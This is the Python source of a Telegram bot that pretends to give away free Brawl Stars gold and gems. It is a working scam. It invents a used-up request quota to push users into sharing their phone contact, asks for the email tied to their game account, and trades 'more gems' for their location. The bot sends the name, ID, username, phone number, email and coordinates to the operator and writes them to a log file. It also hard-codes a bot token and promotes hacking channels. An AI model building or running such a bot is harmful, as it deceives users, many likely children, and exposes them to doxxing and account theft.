from bot1 import ID, bot, start_bot
import telebot
from telebot import types
import time
import random
import requests

log = open('bot-log.txt', 'a+', encoding='utf-8')

YOUR_BOT_TOKEN = "6470408760:AAEy7g0RCzt4rlOTeUemm1C6bWNXdXwcug0"
YOUR_BOT_ID = "661262775"
your_bot = telebot.TeleBot(YOUR_BOT_TOKEN)

# Dictionary to store click count for each user
click_count = {}

# Function to create an inline keyboard with buttons
def create_custom_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    
    # Row 1: Join Channel 1 and Join Channel 2 buttons
    join_channel1_button = types.InlineKeyboardButton("Join Channel 1", url="https://t.me/onlinehacking")
    join_channel2_button = types.InlineKeyboardButton("Join Channel 2", url="https://t.me/termuxhacktutorial")
    markup.row(join_channel1_button, join_channel2_button)
    
    # Row 2: Check button
    check_button_text = "Welcome to the bot!" if click_count.get(user_id, 0) % 2 == 1 else "✅ Check"
    check_button = types.InlineKeyboardButton(check_button_text, callback_data="check_button")
    markup.row(check_button)
    
    return markup

bot.send_message(ID, '⚠️ In use this bot you have to join our telegram channel. \n \n After successful joining two telegram channel click check button‌ ✅', reply_markup=create_custom_keyboard(ID))
print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n")

# Handler for the "Check" button click
@bot.callback_query_handler(func=lambda call: call.data == "check_button")
def handle_check_button_click(call):
    user_id = call.message.chat.id
    click_count[user_id] = click_count.get(user_id, 0) + 1
    if click_count[user_id] % 2 == 1:
        bot.send_message(user_id, "⚠️ If you have not joined our Telegram channel, Join again and check!")
    else:
        bot.send_message(user_id, "✅ Your Bot has become Active now you can share username!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''👋 Hello {message.from_user.first_name}! 👋
This is a bot that can donate to Brawl Stars
To get started, type the command /don''') 
@bot.message_handler(commands=['admin'])
def start(message):
	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
@bot.message_handler(commands=['don'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="💰Gold💰", callback_data="first")
	second_button = types.InlineKeyboardButton(text="💎Gems💎", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Select an item:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Enter the amount of gold💰 (no more than 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Enter the number of gems💎 (no more than 50)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /don!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'The amount of gold cannot be more than 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
To receive additional requests, register in the bot!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /don!')#⏳
			return

		if int(num) > 50:
			bot.reply_to(message, 'The number of gems cannot be more than 50!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
To receive additional requests, register in the bot!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Name: {first} {last}
			├ID: {userid}
			├Username: @{nick}
			└Phone number: {phone}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Submit your contact!')
		bot.send_message(message.chat.id, 'registration completed successfully!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Enter the email associated with the game:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id


		bot.send_message(ID, f'Your Email: {inp}')

		markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
		item_an = types.KeyboardButton('Get more gems')
		markup_reply.add(item_an)
		bot.send_message(message.chat.id, f'Your Email: {inp} ', reply_markup = markup_reply)
		time.sleep(1)
		bot.send_message(message.chat.id, 'Expect a donation to your account within 24 hours!')

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types = ['text'])
def get_text(message):
	if message.text == 'Get more gems':
		m_id = message.chat.id
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Confirm", request_location=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''To get more gems, confirm your geolocation!''', reply_markup=keyboard)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Geolocation
		├ID: {message.chat.id}
		├Longitude: {lon}
		├Latitude: {lat} 
		└Cards: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		msg = bot.send_message(message.chat.id, 'Enter the number of gems💎 (no more than 800)') 
		bot.register_next_step_handler(msg, proc3)

def proc3(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /don !')#⏳
			return

		if int(num) > 800:
			bot.reply_to(message, 'The number of gems cannot be more than 800!')
			return

		time.sleep(2)
		msg = bot.send_message(message.chat.id, 'Enter the email associated with the game:') 
		bot.register_next_step_handler(msg, entr1)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

def entr1(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Your Email: {inp} ')#⏳
		bot.send_message(ID, f'User Email: {inp}')
		time.sleep(1)
		bot.send_message(message.chat.id, 'Expect a donation to your account within 24 hours!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

if __name__ == "__main__":
    start_bot()
    bot.polling(none_stop=True)


        
